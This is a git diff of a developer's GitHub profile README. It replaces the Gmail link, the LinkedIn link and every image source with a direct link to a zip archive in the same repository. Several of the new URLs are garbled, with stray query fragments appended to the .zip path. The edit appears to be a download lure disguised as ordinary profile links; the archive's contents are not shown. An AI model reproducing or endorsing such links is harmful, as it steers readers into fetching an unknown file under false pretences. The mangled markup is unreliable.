@@ -1,7 +1,7 @@
-<img align="right" src="https://visitor-badge.laobi.icu/badge?page_id=Anbarasu-06.Anbarasu-06" />
+<img align="right" src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip" />
 
 <h1 align="center">
-    <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=Hi+There!+👋;+I'm+Anbarasu!;+I'm+Software+Developer" />
+    <img src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip+There!+👋;+I'm+Anbarasu!;+I'm+Software+Developer" />
 </h1>
 
 <h3 align="center">A passionate software developer</h3>
@@ -19,11 +19,11 @@
  </div>
  
 <div align="center"> 
-  <a href="mailto:Anburookie@gmail.com">
-    <img src="https://img.shields.io/badge/Gmail-333333?style=for-the-badge&logo=gmail&logoColor=red" />
+  <a href="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip">
+    <img src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip" />
   </a>
-  <a href="https://www.linkedin.com/in/anbarasu-b-b16191291?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
-    <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" target="_blank" />
+  <a href="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip" target="_blank" />
   </a>
 
 </div>
@@ -33,8 +33,8 @@
 <h2 align="center">⚒️ Languages-Frameworks-Tools ⚒️</h2>
 <br/>
 <div align="center">
-    <img src="https://skillicons.dev/icons?i=bootstrap,html,css,sass,vscode,java,eclipse,github,figma,linux,git" />
-    <img src="https://skillicons.dev/icons?i=mysql,nodejs,python,react,javascript,firebase,mongodb,c" /><br>
+    <img src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip,html,css,sass,vscode,java,eclipse,github,figma,linux,git" />
+    <img src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip,nodejs,python,react,javascript,firebase,mongodb,c" /><br>
 </div>
 
 <br/>
@@ -43,7 +43,7 @@
 
 
 <h1 align="center">
-    <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=Thank+You;+Follow+Me!" />
+    <img src="https://raw.githubusercontent.com/Anbarasu-06/Anbarasu-06/main/liquid/Anbarasu-06.zip+You;+Follow+Me!" />
 </h1>
 
 <br/>
